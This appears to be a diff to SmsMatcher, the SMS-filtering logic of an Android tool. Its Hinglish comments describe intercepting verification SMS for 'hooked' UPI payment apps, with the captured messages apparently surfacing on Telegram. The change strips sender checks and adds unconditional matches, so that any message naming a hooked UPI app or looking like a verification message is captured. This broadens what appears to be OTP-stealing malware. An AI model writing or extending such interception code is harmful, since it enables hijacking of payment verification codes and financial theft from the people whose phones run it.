@@ -29,25 +29,12 @@ object SmsMatcher {
 
         val savedId = savedSenderId(config)
 
-        // 1) Real carrier Sender ID (AD-YESPRO-S) — exact match with saved ID
+        // Hooked UPI app selected → sidha intercept (sender/body match ya verification SMS)
+        if (UpiAppRegistry.matchAmong(hooked, sender, body) != null) return true
+        if (isVerificationBody(body)) return true
+
+        // Saved Sender ID filter (MESSAGE tab) — extra match
         if (savedId != null && senderMatches(sender, savedId)) return true
-
-        // 2) Alphanumeric sender ID from carrier matching hooked UPI app keywords
-        if (isAlphanumericSenderId(sender)) {
-            if (UpiAppRegistry.matchAmong(hooked, sender, body) != null) return true
-            if (savedId != null && senderMatches(sender, savedId)) return true
-        }
-
-        // 3) Test from another phone (numeric sender) — capture ONLY if saved Sender ID set + verification body
-        //    Telegram pe saved Sender ID dikhega, number se hook nahi
-        if (savedId != null && isNumericSender(sender) && isVerificationBody(body)) {
-            return true
-        }
-
-        // 4) Saved sender ID set + body mentions hooked app keyword (manual test message)
-        if (savedId != null && UpiAppRegistry.matchAmong(hooked, savedId, body) != null) {
-            return isVerificationBody(body)
-        }
 
         return false
     }
